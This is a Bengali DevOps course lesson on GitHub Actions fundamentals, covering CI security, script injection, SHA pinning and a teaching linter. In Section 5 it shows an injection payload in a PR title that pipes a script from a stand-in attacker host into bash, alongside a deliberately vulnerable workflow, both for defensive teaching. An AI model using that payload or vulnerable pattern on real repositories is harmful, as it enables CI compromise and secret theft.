# L03-06 — GitHub Actions fundamentals

| | |
|---|---|
| **Module** | 03 — Git and Collaboration |
| **Difficulty** | Beginner |
| **আনুমানিক সময়** | ৩.৫ ঘণ্টা |
| **পূর্বশর্ত** | [L03-03 — Remote ও tag](L03-03-remotes-tags-semver.md), [L03-04 — Pull request](L03-04-pull-requests-review.md), [L01-06 — Shell](../01-linux-systems/L01-06-shell-fundamentals.md) |
| **Label** | — (public repository-তে GitHub-hosted runner বিনামূল্যে; private-এ মাসিক মিনিট-সীমা) |
| **Tested** | `workflow_lint.py`: ৭টি test পাস — খারাপ নমুনায় ৩টি ERROR ও ৪টি WARN, ভালো নমুনা পরিষ্কার, script injection (inline বনাম `env:`), trusted context-এ false positive নেই, SHA pinning, permission/timeout, এবং **এই repository-র নিজের workflow-এর regression guard** (Python 3.14, Windows)। Action-এর tag ও SHA **`git ls-remote` দিয়ে GitHub থেকে আসলে যাচাই করা** হয়েছে (২০২৬-১০-২৭)। Linter এই repository-র `.github/workflows/validate.yml`-এ আসল ত্রুটি পেয়েছে, যা ঠিক করা হয়েছে — Section 9.3। **GitHub-এ workflow আসলে চালানো হয়নি** — এই repository এখনো GitHub-এ push হয়নি। |

---

## 1. এই lesson-এ যা শিখবেন

- **CI** কী এবং কেন প্রতিটি push/PR-এ স্বয়ংক্রিয় যাচাই।
- GitHub Actions-এর গঠন: **workflow → trigger (`on`) → job → step → action**; runner।
- Job-এর ক্রম (`needs`), **matrix**, **cache**, **artifact**, **concurrency**, **timeout**।
- `GITHUB_TOKEN` ও **`permissions`** — least privilege।
- **Secret** ও **environment**; fork PR-এর নিরাপত্তা।
- Workflow-এর তিনটি বড় নিরাপত্তা ঝুঁকি: **script injection**, **`pull_request_target`-এর অপব্যবহার**, **unpinned action** (supply chain)।
- Python দিয়ে workflow-এর নিরাপত্তা lint, এবং এই repository-র নিজের workflow-এ প্রয়োগ।

## 2. এই ধারণা কোন সমস্যার সমাধান করে

মানুষ ভুলে যায় test চালাতে। "আমার machine-এ চলে" কথাটা team-এ অর্থহীন। Review-এর সময় (L03-04) reviewer জানতে চান: code compile হয়? test পাস করে? Formatting ঠিক? Secret নেই?

**Continuous Integration (CI)** প্রতিটি পরিবর্তনে একটি পরিষ্কার machine-এ একই ধাপ চালায় এবং ফল PR-এ দেখায়। Protected branch-এর "required status check" (L03-04) এর উপর নির্ভর করে।

কিন্তু CI নিজেই একটি **উঁচু-অধিকারের system**: এর কাছে secret (deploy key, cloud credential), repository-তে লেখার token এবং production-এ পৌঁছানোর পথ থাকে। তাই workflow-এর ভুল সরাসরি supply-chain আক্রমণের দরজা। বাস্তবে third-party action compromise হয়ে বহু repository-র CI secret ফাঁস হওয়ার ঘটনা ঘটেছে।

Module 06 (CI/CD) এই lesson-এর উপর পূর্ণ pipeline বানাবে: build, test, scan, image, deploy।

## 3. সহজ ভাষায় পরিচয়

```yaml
name: ci                          # workflow-এর নাম
on:                               # কখন চলবে (trigger)
  pull_request:
  push:
    branches: [main]
permissions:                      # GITHUB_TOKEN-এর অধিকার — সবচেয়ে কম
  contents: read
jobs:
  test:                           # job — একটি runner-এ চলে
    runs-on: ubuntu-24.04         # runner: GitHub-hosted VM (প্রতি job-এ নতুন, পরিষ্কার)
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@<sha> # v4.2.2      # action — পুনর্ব্যবহারযোগ্য step
      - run: python -m unittest -v                  # shell command
```

| ধারণা | অর্থ |
|---|---|
| Workflow | `.github/workflows/*.yml` — একটি স্বয়ংক্রিয় প্রক্রিয়া |
| Trigger (`on`) | `push`, `pull_request`, `schedule` (cron), `workflow_dispatch` (হাতে), tag push, release |
| Job | একটি runner-এ ধারাবাহিক step; job-গুলো default-এ **সমান্তরালে** চলে, `needs` দিয়ে ক্রম |
| Step | `run:` (shell) বা `uses:` (action) |
| Runner | Job চালানোর machine: GitHub-hosted (Ubuntu/Windows/macOS) বা self-hosted |
| Action | পুনর্ব্যবহারযোগ্য অংশ (`actions/checkout`, `actions/setup-python`) — অন্যের code! |
| Matrix | একই job বিভিন্ন Python/OS-এ |
| Artifact / cache | Job-এর ফল সংরক্ষণ / dependency পুনর্ব্যবহার |
| Secret | Encrypted মান (`${{ secrets.NAME }}`), log-এ mask করা |
| Environment | `production`-এর মতো নাম — approval ও আলাদা secret |

## 4. বাস্তব জীবনের উদাহরণ (analogy)

### কারখানার মান-নিয়ন্ত্রণ লাইন

- **Workflow** = উৎপাদন লাইনের নিয়মপুস্তক।
- **Trigger** = "প্রতিটি নতুন batch এলে" লাইন চালু।
- **Job ও step** = লাইনের প্রতিটি station: ওজন মাপা, চাপ পরীক্ষা, প্যাকেজিং।
- **Runner** = প্রতিটি batch-এর জন্য নতুন পরিষ্কার workbench।
- **Action** = বাইরে থেকে কেনা যন্ত্র।
- **Secret** = কারখানার তালার চাবি — শুধু নির্দিষ্ট station-এ।
- **Status check** = মান-নিয়ন্ত্রণের ছাপ; ছাপ ছাড়া মাল গুদামে যায় না (protected branch)।

### Analogy কোথায় মেলে না

- কেনা যন্ত্র একবার পরীক্ষা করলে বদলায় না। Action-এর **tag বদলানো যায়** — `@v4` আজ এক code, কাল অন্য code (Section 9.3-এ বাস্তব প্রমাণ: `v4` ও `v4.2.2` এখন ভিন্ন commit)। তাই **commit SHA দিয়ে pin** করতে হয়।
- কারখানার মাল নিষ্ক্রিয়। CI-তে PR-এর "মাল" হলো **code যা চালানো হয়** — বাইরের contributor-এর code আপনার runner-এ চলে। এমনকি PR-এর **title**-ও ভুলভাবে ব্যবহার করলে shell command হয়ে যায় (script injection, Section 8.3)।
- Station-এর ভুল পণ্যে আটকে থাকে। CI-এর ভুল **production-এ** যেতে পারে (deploy job), এবং CI-এর token দিয়ে repository-ও বদলানো যেতে পারে — তাই অধিকার ন্যূনতম রাখতে হয়।

## 5. Real-world engineering scenario — "PR-এর title-এ লুকানো command"

**পরিস্থিতি:** একটি open-source project-এর workflow নতুন PR-কে স্বাগত জানাত:

```yaml
on: pull_request_target
permissions: write-all
steps:
  - run: echo "Thanks for: ${{ github.event.pull_request.title }}"
```

একজন আক্রমণকারী PR খুললেন, title দিলেন: `x"; curl -s https://attacker.example/x.sh | bash; echo "`।

**কী ঘটল:** `${{ }}` expression shell চালানোর **আগেই** text হিসেবে বসে যায়। ফলে runner চালাল: `echo "Thanks for: x"; curl … | bash; echo ""`। `pull_request_target` base repository-র context-এ চলে — secret ও write token সহ। আক্রমণকারী repository-তে লেখার অধিকার ও secret পেয়ে গেলেন।

**তিনটি ভুল** (এই lesson-এর `workflow_lint.py` তিনটিই ধরে):

1. Attacker-নিয়ন্ত্রিত value সরাসরি `run:`-এ — script injection।
2. `pull_request_target` — প্রয়োজন ছাড়া।
3. `permissions: write-all`।

**সঠিক রূপ:**

```yaml
on: pull_request                      # fork PR-এ secret নেই, read-only token
permissions:
  pull-requests: write                # শুধু comment করার জন্য যা দরকার
steps:
  - env:
      TITLE: ${{ github.event.pull_request.title }}   # data হিসেবে, code নয়
    run: echo "Thanks for: $TITLE"
```

**শিক্ষা:** Workflow = code, এবং এটি সবচেয়ে বেশি অধিকার নিয়ে চলে। Review, lint ও CODEOWNERS (security team) প্রযোজ্য — L03-04।

## 6. Diagram — একটি PR-এর CI run

```text
 git push feature/x ──► GitHub ──► PR #42 (pull_request event)
                                     │
                       ┌─────────────┴──────────────┐ concurrency: পুরোনো run বাতিল
                       ▼                            ▼
              job: lint (ubuntu-24.04)      job: test (matrix: py3.12, py3.13)
              ├ checkout@<sha>              ├ checkout@<sha>
              ├ setup-python@<sha>          ├ setup-python@<sha> (cache: pip)
              └ run: ruff check             └ run: unittest   ──► artifact: test report
                       │                            │
                       └──────────┬─────────────────┘
                                  ▼ needs: [lint, test]
                          job: build (শুধু main-এ push হলে)
                                  ▼
               PR-এ status: ✓ lint ✓ test (3.12) ✓ test (3.13) → protected branch merge অনুমতি
 GITHUB_TOKEN: contents: read (default-এর চেয়ে কম) · fork PR: secret নেই
```

## 7. গুরুত্বপূর্ণ terminology

| Term | বাংলা ব্যাখ্যা |
|---|---|
| CI | প্রতিটি পরিবর্তনে স্বয়ংক্রিয় build ও test |
| Workflow / job / step | প্রক্রিয়া / এক runner-এর কাজ / একটি ধাপ |
| Runner (hosted / self-hosted) | GitHub-এর VM / নিজের machine |
| Action | পুনর্ব্যবহারযোগ্য step (marketplace বা নিজের) |
| `GITHUB_TOKEN` | প্রতি run-এর স্বয়ংক্রিয়, স্বল্পমেয়াদি token |
| `permissions` | Token-এর অধিকার (contents, pull-requests, packages, id-token…) |
| Secret / variable | Encrypted / সাধারণ configuration |
| Environment | Deploy target, approval ও আলাদা secret সহ |
| Matrix | একাধিক configuration-এ একই job |
| Cache / artifact | Dependency পুনর্ব্যবহার / ফল সংরক্ষণ |
| Concurrency | একই group-এ একসাথে একটিই run |
| Expression `${{ }}` | YAML-এ মান বসানো — shell চালানোর আগেই |
| Script injection | Untrusted text code হয়ে চলা |
| SHA pinning | Action-কে নির্দিষ্ট commit-এ বাঁধা |
| OIDC | Cloud-এ secret ছাড়া স্বল্পমেয়াদি credential (Module 06, 19) |

## 8. ভেতরে কীভাবে কাজ করে

### 8.1 Run-এর জীবনচক্র

1. Event (push/PR) → GitHub `.github/workflows/`-এর সব workflow পড়ে, `on`-এর সাথে মেলায়।
2. প্রতিটি job-এর জন্য একটি নতুন runner VM বরাদ্দ হয় (hosted runner-এ প্রতিবার পরিষ্কার)।
3. Runner একটি স্বল্পমেয়াদি `GITHUB_TOKEN` পায়, যার অধিকার `permissions` দিয়ে সীমিত।
4. Step-গুলো ক্রমানুসারে চলে। কোনো step-এর exit code ≠ ০ হলে job fail (L01-06)।
5. Job শেষ হলে VM ধ্বংস হয়। Cache ও artifact আলাদাভাবে সংরক্ষিত থাকে।
6. ফল commit/PR-এ check হিসেবে দেখায়; protected branch সেটি পড়ে।

`pull_request` event-এ GitHub PR branch ও base-এর একটি **merge commit**-এ test চালায় — অর্থাৎ "merge করলে কী হবে" সেটাই পরীক্ষা হয়।

### 8.2 Permission ও secret

- `permissions:` না দিলে token repository/organization-এর default setting অনুযায়ী অধিকার পায় (পুরোনো repository-তে প্রায়ই read/write)। সবসময় top-level-এ `contents: read` দিন, দরকার হলে job-level-এ বাড়ান।
- Secret log-এ mask হয়, কিন্তু রূপান্তরিত হলে (base64, অক্ষর আলাদা করে) mask কাজ করে না — **কখনো print নয়**।
- Fork থেকে আসা `pull_request`-এ secret দেওয়া হয় না এবং token read-only থাকে — এটা নিরাপত্তার ইচ্ছাকৃত নকশা।
- `pull_request_target` ও `workflow_run` base repository-র অধিকারে চলে। এর ভেতরে PR-এর code checkout ও চালানো একটি পরিচিত বিপজ্জনক pattern।
- Cloud credential-এর জন্য দীর্ঘমেয়াদি key-এর বদলে OIDC (`id-token: write`) ব্যবহার করুন — Module 06।

### 8.3 Script injection কেন ঘটে

`${{ expression }}` GitHub-এর template, shell-এর variable নয়। Runner script লেখার **আগেই** expression-এর মান text হিসেবে বসে যায়। Attacker-নিয়ন্ত্রিত context-এর উদাহরণ:

- `github.event.issue.title` / `.body`
- `github.event.pull_request.title` / `.body` / `.head.ref`
- `github.event.comment.body`
- `github.head_ref`
- commit message

এগুলো কখনো সরাসরি `run:`-এ বসাবেন না। `env:`-এ রাখুন এবং shell-এ `"$VAR"` (quote সহ, L01-06) ব্যবহার করুন। তখন মানটি data হিসেবে যায়, code হিসেবে নয়।

### 8.4 SHA pinning ও supply chain

`uses: actions/checkout@v4` মানে "এই repository-র `v4` নামের ref এখন যেখানে আছে"। Tag বা branch সরানো যায় (L03-03), এবং maintainer-এর account compromise হলে ক্ষতিকর code-এ সরানোও যায়। Commit SHA অপরিবর্তনীয় (L03-01)।

পদ্ধতি:

1. SHA বের করুন: `git ls-remote https://github.com/actions/checkout refs/tags/v4.2.2`।
2. Pin করুন: `uses: actions/checkout@<sha> # v4.2.2` — comment-এ version রাখুন, যাতে update tool (Dependabot) বুঝতে পারে।
3. Dependabot-কে `github-actions` ecosystem-এর update PR তৈরি করতে দিন — নতুন SHA review-এর মাধ্যমে আসবে।

## 9. Practical demonstration

### 9.1 খারাপ workflow lint

Files: [`code/L03-06/workflow_lint.py`](code/L03-06/workflow_lint.py), [`sample-bad-workflow.yml`](code/L03-06/sample-bad-workflow.yml) (হাতে তৈরি, ইচ্ছাকৃত ভুলে ভরা), [`sample-good-workflow.yml`](code/L03-06/sample-good-workflow.yml)।

```bash
cd ~/devops-ai-engineering/03-git-and-collaboration/code/L03-06
python3 workflow_lint.py sample-bad-workflow.yml
```

**আসল output:**

```text
sample-bad-workflow.yml: 8 finding(s)
  INFO  no `concurrency:` — repeated pushes run in parallel and waste minutes
  ERROR line 9: `permissions: write-all` — grant only the scopes needed
  WARN  line 15: `actions/checkout@v4` is pinned to a tag/branch, not a commit SHA — a moved tag runs different code (pin: owner/action@<40-hex-sha> # vX.Y.Z)
  ERROR line 15: pull_request_target checks out the PR's code — untrusted code runs with secrets and a write token
  ERROR line 21: untrusted `${{ github.event... }}` expanded inside `run:` — script injection; pass it through `env:` and use "$VAR"
  WARN  line 22: secret printed in `run:` — masking is best-effort; never echo secrets
  WARN  line 27: `some-org/fancy-comment-action@main` is pinned to a tag/branch, not a commit SHA — a moved tag runs different code (pin: owner/action@<40-hex-sha> # vX.Y.Z)
  WARN  job `greet` has no timeout-minutes — a hung job runs up to the 6-hour default
```

Section 5-এর তিনটি ভুলই ERROR হিসেবে ধরা পড়েছে। `@main` — একটি branch, যা প্রতি মুহূর্তে বদলাতে পারে — সবচেয়ে খারাপ pinning। `sample-good-workflow.yml`-এ `0 finding(s)` আসে।

### 9.2 Action-এর tag সত্যিই সরে — GitHub থেকে যাচাই

```bash
git ls-remote --tags https://github.com/actions/checkout | grep -E 'refs/tags/v(4|4\.2\.2|5)$'
git ls-remote --tags https://github.com/actions/setup-python | grep -E 'refs/tags/v(4|5|5\.6\.0)$'
```

**আসল output (২০২৬-১০-২৭; সময়ের সাথে বদলাবে — সেটাই মূল কথা):**

```text
11d5960a326750d5838078e36cf38b85af677262	refs/tags/v4
11bd71901bbe5b1630ceea73d27597364c9af683	refs/tags/v4.2.2
fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09	refs/tags/v5
7f4fc3e22c37d6ff65e88745f38bd3157c663f7c	refs/tags/v4
a26af69be951a213d495a4c3e4e4022e16d87065	refs/tags/v5
a26af69be951a213d495a4c3e4e4022e16d87065	refs/tags/v5.6.0
```

`actions/checkout`-এর `v4` এখন `11d5960`-এ, অথচ `v4.2.2` আছে `11bd719`-এ। অর্থাৎ `@v4` লেখা workflow যে code চালায়, তা `v4.2.2`-এর পরে **বদলে গেছে** — major tag নতুন release-এ সরানো হয়। এখানে তা বৈধ maintenance, কিন্তু একই কৌশল আক্রমণেও ব্যবহার করা যায়। `setup-python`-এর `v5` ও `v5.6.0` এখন একই commit-এ — আপাতত, পরের release পর্যন্ত।

### 9.3 এই repository-র নিজের workflow — linter যা পেল

এই repository-র [`.github/workflows/validate.yml`](../.github/workflows/validate.yml) foundation পর্যায়ে লেখা হয়েছিল। Lint-এর আসল output (ঠিক করার **আগে**):

```text
..\..\..\.github\workflows\validate.yml: 3 finding(s)
  INFO  no `concurrency:` — repeated pushes run in parallel and waste minutes
  WARN  line 17: `actions/checkout@v4` is pinned to a tag/branch, not a commit SHA — ...
  WARN  line 19: `actions/setup-python@v5` is pinned to a tag/branch, not a commit SHA — ...
..\..\..\templates\github-actions-ci.yml: 3 finding(s)
  WARN  line 27: `actions/checkout@v4` ...
  WARN  line 28: `actions/setup-python@v5` ...
  WARN  line 42: `actions/checkout@v4` ...
```

**ঠিক করা হয়েছে:**

- দুটি file-এ action Section 9.2-এ যাচাই করা SHA দিয়ে pin করা হয়েছে (`# v4.2.2`, `# v5.6.0` comment সহ)।
- `validate.yml`-এ `concurrency` যোগ করা হয়েছে।

এখন lint `0 finding(s)`। Test-এর `test_repository_workflows_stay_clean` ভবিষ্যতে কেউ unpinned action যোগ করলে fail করবে — একটি **regression guard**।

### 9.4 নিজের GitHub practice repository-তে

1. `sample-good-workflow.yml`-কে `.github/workflows/ci.yml` হিসেবে রাখুন, একটি ছোট `tests/` সহ (L03-04-এর practice repo)।
2. Push → Actions tab-এ run দেখুন; matrix-এর দুটি job।
3. একটি test ইচ্ছাকৃতভাবে ভাঙিয়ে PR খুলুন → check লাল → protected branch merge আটকায় (L03-04)।
4. `gh` CLI দিয়ে:

```bash
gh run list --limit 5
gh run watch                     # চলমান run
gh run view --log-failed         # শুধু ব্যর্থ step-এর log
gh workflow run ci.yml           # workflow_dispatch থাকলে হাতে চালানো
```

Local-এ workflow চালানোর জন্য `act` নামের community tool আছে। এটি Docker দিয়ে runner অনুকরণ করে, কিন্তু পুরোপুরি একই নয় — শেষ যাচাই GitHub-এই।

### 9.5 Test

```bash
python3 -m unittest -v
```

[`test_workflow_lint.py`](code/L03-06/test_workflow_lint.py)-এর ৭টি test:

- খারাপ নমুনায় ঠিক ৩টি ERROR ও ৪টি WARN; ভালো নমুনা পরিষ্কার।
- `github.head_ref` inline হলে injection; `env:`-এ রাখলে নিরাপদ।
- `github.sha`, `github.event.number`, `matrix.os` (attacker-নিয়ন্ত্রিত নয়) ধরে না।
- Pinning: local action, digest-pinned docker ও SHA ঠিক, `@v4` নয়।
- Permission নেই ও job-এর timeout নেই।
- এই repository-র workflow ও template পরিষ্কার।

## 10. Code-এর ব্যাখ্যা

| অংশ | কী করে | কেন |
|---|---|---|
| YAML parser ছাড়া, line + indentation | `run:` block-এর সীমানা চেনা | Standard library-only নীতি; সীমাবদ্ধতা স্পষ্ট |
| `TAINTED` regex | Attacker-নিয়ন্ত্রিত context | `github.sha`-র মতো নিরাপদ context-এ false positive নয় |
| শুধু `run:`-এর ভেতরে injection | `env:`-এ একই expression নিরাপদ | Section 8.3 |
| `SHA_PIN` ৪০ hex | `./` ও `docker://` বাদ | Local action repository-র অংশ; docker digest-pinned হতে পারে |
| `pull_request_target` + checkout-এর পরের ৬ লাইনে `ref:` | Head checkout | পরিচিত বিপজ্জনক pattern |
| INFO exit code-এ গণ্য নয় | `concurrency` অনুপস্থিতি | খরচের বিষয়, নিরাপত্তার নয় |

**সীমাবদ্ধতা:** পূর্ণ YAML বোঝে না (anchor, flow style, composite action, reusable workflow); `${{ }}` expression-এর ভেতরের function বিশ্লেষণ করে না। গুরুত্বপূর্ণ repository-তে পরিপক্ব tool ব্যবহার করুন — যেমন `actionlint` (syntax ও type), `zizmor` (নিরাপত্তা), এবং GitHub-এর CodeQL-এর Actions analysis।

**Python কেন এখানে, কোথায় নয়:** ধারণাগুলো পরীক্ষাযোগ্যভাবে দেখাতে ও এই repository-র regression guard হিসেবে Python যথেষ্ট। Production নিরাপত্তা scan-এর জন্য উপরের বিশেষায়িত tool।

## 11. প্রত্যাশিত ফল ও যাচাই

| যাচাই | প্রত্যাশিত |
|---|---|
| `workflow_lint.py sample-bad-workflow.yml` | ৩ ERROR, ৪ WARN, ১ INFO, exit ১ |
| `workflow_lint.py sample-good-workflow.yml` | `0 finding(s)`, exit ০ |
| `workflow_lint.py ../../../.github/workflows/validate.yml` | `0 finding(s)` (ঠিক করার পরে) |
| `git ls-remote ... refs/tags/v4.2.2` | `11bd719…` (আজ ও চিরকাল — tag সরানো না হলে) |
| `python3 -m unittest -v` | `Ran 7 tests`, `OK` |

## 12. সাধারণ ভুল ও troubleshooting

| Symptom | কারণ | সমাধান |
|---|---|---|
| Workflow চলে না | File `.github/workflows/`-এ নেই, YAML ভুল, trigger মেলে না | Actions tab-এর error; `actionlint` |
| `Resource not accessible by integration` | Token-এর permission নেই | Job-level-এ নির্দিষ্ট permission |
| Fork PR-এ secret খালি | নিরাপত্তার জন্য ইচ্ছাকৃত | Secret ছাড়া test; deploy শুধু main/tag-এ |
| Required check "expected — waiting" | Job-এর নাম বদলেছে বা path filter-এ চলেনি | Protection-এর check নাম মেলান (L03-04) |
| Local-এ চলে, CI-তে fail | ভিন্ন OS, Python version, timezone, locale, network | Matrix-এ local version; deterministic test |
| CI ধীর | Cache নেই, প্রতিবার dependency install | `cache: pip`, path filter, concurrency |
| Secret log-এ দেখা গেল | Print বা রূপান্তর | Secret rotate করুন (প্রথমে!), workflow ঠিক করুন |
| Job ৬ ঘণ্টা ঝুলে থাকে | `timeout-minutes` নেই | প্রতিটি job-এ timeout দিন |

## 13. Security, performance ও cost বিবেচনা

- **Security:**
  - Top-level `permissions: contents: read` রাখুন।
  - Third-party action SHA-pinned রাখুন এবং Dependabot দিয়ে update করুন।
  - Untrusted input `env:` দিয়ে দিন।
  - `pull_request_target` এড়িয়ে চলুন।
  - Secret শুধু দরকারি job-এ ও environment-এ রাখুন; cloud-এ OIDC।
  - `checkout`-এ `persist-credentials: false` দিন (দরকার না হলে)।
  - Public repository-তে self-hosted runner ব্যবহার করবেন না (fork PR আপনার machine-এ code চালাবে)।
  - Workflow file-এর code owner হবে security team (L03-04)।
- **Performance:**
  - Job সমান্তরালে চালান।
  - Dependency cache ব্যবহার করুন।
  - `concurrency` দিয়ে পুরোনো run বাতিল করুন।
  - Path filter দিন (`paths:`)।
  - দ্রুত job (lint) আগে চালান, fail fast।
- **Cost:**
  - Private repository-তে hosted runner-এর মিনিট সীমিত; Windows ও macOS runner Linux-এর চেয়ে অনেক বেশি "মিনিট" খরচ করে।
  - Artifact ও cache storage-এর সীমা আছে।
  - বর্তমান সীমা ও দাম GitHub-এর billing documentation-এ দেখুন — এগুলো বদলায়।

## 14. Hands-on exercise

1. `sample-bad-workflow.yml` ঠিক করে `0 finding(s)` আনুন। Comment-বাহক action-এর জন্য `pull_request` + সীমিত `pull-requests: write` ব্যবহার করুন।
2. `workflow_lint.py`-তে একটি নতুন check যোগ করুন: `runs-on: self-hosted` থাকলে এবং trigger-এ `pull_request` থাকলে WARN। Test লিখুন।
3. Practice repository-তে `sample-good-workflow.yml` চালান; তারপর একটি PR-এর title-এ `$(whoami)` লিখে দেখুন — `env:`-এর মাধ্যমে নিরাপদে text হিসেবে ছাপা হয় কি?
4. Dependabot-এর `.github/dependabot.yml` লিখুন, `package-ecosystem: github-actions` সহ। একটি SHA-pinned action-এর update PR কেমন দেখায়, লক্ষ্য করুন।
5. এই repository-র `validate.yml`-এর lesson-code test loop নিজের machine-এ bash দিয়ে চালান — CI-তে কী ঘটবে তা local-এ দেখা।

## 15. Mini-project — Release workflow

L03-03-এর `release.sh` ও `semver.py`-কে একটি tag-triggered workflow-এ রূপ দিন:

- **Trigger:** `on: push: tags: ['v*']`।
- **Job ১:** tag-এর version SemVer কিনা যাচাই, এবং tag-এর commit main-এ আছে কিনা।
- **Job ২ (`needs`):** test।
- **Job ৩:** GitHub release তৈরি — changelog সহ, `contents: write` শুধু এই job-এ।

Lint পরিষ্কার হতে হবে, এবং action SHA-pinned। Module 06-এ এখানে image build ও deploy যোগ হবে।

## 16. Interview প্রশ্ন

1. GitHub Actions-এ workflow, job, step ও action-এর সম্পর্ক কী?
2. Job-গুলো কীভাবে ক্রমানুসারে চালাবেন? Matrix কী?
3. `GITHUB_TOKEN`-এর permission কেন সীমিত রাখবেন? কীভাবে?
4. Script injection কী, এবং কীভাবে প্রতিরোধ করবেন?
5. `pull_request` ও `pull_request_target`-এর পার্থক্য কী?
6. Action-কে tag-এর বদলে SHA দিয়ে কেন pin করবেন?
7. CI-তে cloud credential নিরাপদে কীভাবে দেবেন?

## 17. Self-assessment প্রশ্ন

1. কারখানা analogy কোথায় মেলে না (তিনটি বিষয়)?
2. Section 5-এর আক্রমণে PR title কীভাবে command হয়ে গেল?
3. Section 9.2-এ `v4` ও `v4.2.2`-এর SHA ভিন্ন কেন, এবং এর তাৎপর্য কী?
4. এই repository-র workflow-এ linter কী পেয়েছিল, এবং কীভাবে ঠিক করা হলো?
5. `env:`-এ expression রাখলে তা কেন নিরাপদ?

## 18. সংক্ষিপ্ত সারাংশ

- GitHub Actions: workflow (trigger) → job (runner) → step (`run` / `uses`)।
- প্রতিটি PR-এ পরিষ্কার runner-এ test; protected branch-এর required check।
- `permissions` ন্যূনতম রাখুন; secret শুধু দরকারি জায়গায়; fork PR-এ secret নেই।
- Untrusted `${{ github.event… }}` কখনো `run:`-এ নয় — `env:` দিয়ে।
- `pull_request_target` এড়িয়ে চলুন; action SHA দিয়ে pin করুন — tag সত্যিই সরে।
- Workflow = সবচেয়ে বেশি অধিকারের code: review, lint ও code owner।

## 19. Completion checklist

- [ ] `workflow_lint.py` দিয়ে খারাপ নমুনার প্রতিটি finding ব্যাখ্যা করতে পারি
- [ ] `git ls-remote` দিয়ে একটি action-এর SHA বের করে pin করেছি
- [ ] Practice repository-তে একটি CI workflow চালিয়ে PR-এ check দেখেছি
- [ ] Script injection-এর নিরাপদ রূপ (`env:`) নিজে পরীক্ষা করেছি
- [ ] `python3 -m unittest -v`-এ ৭টি test পাস
- [ ] [PROGRESS.md](PROGRESS.md)-এ learner status আপডেট

## 20. Official documentation ও further reading

- GitHub Actions documentation: https://docs.github.com/en/actions
- Workflow syntax: https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions
- Security hardening for GitHub Actions: https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions
- Automatic token authentication (`GITHUB_TOKEN`): https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication
- Events that trigger workflows: https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows
- Dependabot for GitHub Actions: https://docs.github.com/en/code-security/dependabot/working-with-dependabot/keeping-your-actions-up-to-date-with-dependabot
- actionlint: https://github.com/rhysd/actionlint

---

**পরের lesson:** L04-01 — Bash script-এর গঠন ও strict mode (Module 03 সম্পূর্ণ — তার আগে [Module 03 labs](../labs/03-git-and-collaboration/README.md) ও [quiz](../assessments/03-git-and-collaboration/quiz.md))
